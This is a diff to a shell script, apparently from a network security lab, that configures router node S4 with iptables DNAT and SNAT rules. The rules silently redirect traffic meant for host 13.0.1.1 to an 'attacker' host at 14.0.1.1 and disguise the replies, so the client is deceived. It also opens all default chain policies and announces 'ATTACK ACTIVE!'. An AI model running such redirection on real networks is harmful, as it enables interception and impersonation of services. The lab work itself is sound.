@@ -36,35 +36,42 @@ sudo python3 run.py --node S4 --cmd "sysctl -w net.ipv4.ip_forward=1 > /dev/null
 echo "Done."
 
 echo ""
-echo "[3] Setting up DNAT on S4 to redirect 13.0.1.1 -> 14.0.1.1..."
-# Clear old rules if they exist
-sudo python3 run.py --node S4 --cmd "iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null; true"
+echo "[3] Setting up NAT on S4..."
 
-# DNAT: redirect traffic destined for 13.0.1.1 to h4-1 at 14.0.1.1
+# First, ensure FORWARD chain allows traffic (set default policy to ACCEPT)
+sudo python3 run.py --node S4 --cmd "iptables -P FORWARD ACCEPT"
+sudo python3 run.py --node S4 --cmd "iptables -P INPUT ACCEPT"
+sudo python3 run.py --node S4 --cmd "iptables -P OUTPUT ACCEPT"
+
+# Delete old rules if they exist (don't flush entire chain)
+sudo python3 run.py --node S4 --cmd "iptables -t nat -D PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1 2>/dev/null || true"
+sudo python3 run.py --node S4 --cmd "iptables -t nat -D POSTROUTING -s 14.0.1.1 -j SNAT --to-source 13.0.1.1 2>/dev/null || true"
+
+# Add DNAT rule: redirect traffic destined for 13.0.1.1 to h4-1 at 14.0.1.1
 sudo python3 run.py --node S4 --cmd "iptables -t nat -A PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1"
 
-# FORWARD: allow traffic to 14.0.1.0/24
-sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -d 14.0.1.0/24 -j ACCEPT"
-sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -s 14.0.1.0/24 -j ACCEPT"
-
-# SNAT: rewrite response from 14.0.1.1 back to 13.0.1.1
+# Add SNAT rule: rewrite response from h4-1 back to 13.0.1.1
 sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.1 -j SNAT --to-source 13.0.1.1"
 
 echo "Done."
+
+echo ""
+echo "[4] Verifying S4 can reach h4-1..."
+sudo python3 run.py --node S4 --cmd "ping -c 1 14.0.1.1 > /dev/null 2>&1" && echo "✓ S4 can reach h4-1" || echo "✗ S4 cannot reach h4-1"
 
 echo ""
 echo "=========================================="
 echo "ATTACK ACTIVE!"
 echo "=========================================="
 echo ""
-echo "What happens:"
-echo "  1. Client requests 13.0.1.1 (h3-1)"
-echo "  2. S1 routes it to S4 via 13.0.1.0/24 route"
-echo "  3. S4 intercepts with DNAT -> redirects to 14.0.1.1 (h4-1)"
-echo "  4. h4-1 (attacker) responds"
-echo "  5. S4 SNAT rewrites response back to 13.0.1.1"
-echo "  6. Client thinks it's talking to h3-1 but actually h4-1!"
+echo "Flow:"
+echo "  Client -> S1 -> S4 (via 13.0.1.0/24)"
+echo "  S4 intercepts with DNAT: 13.0.1.1 -> 14.0.1.1 (h4-1)"
+echo "  h4-1 (attacker) responds"
+echo "  S4 SNAT rewrites: 14.0.1.1 -> 13.0.1.1"
+echo "  Response returns to client"
 echo ""
+
 
 
 
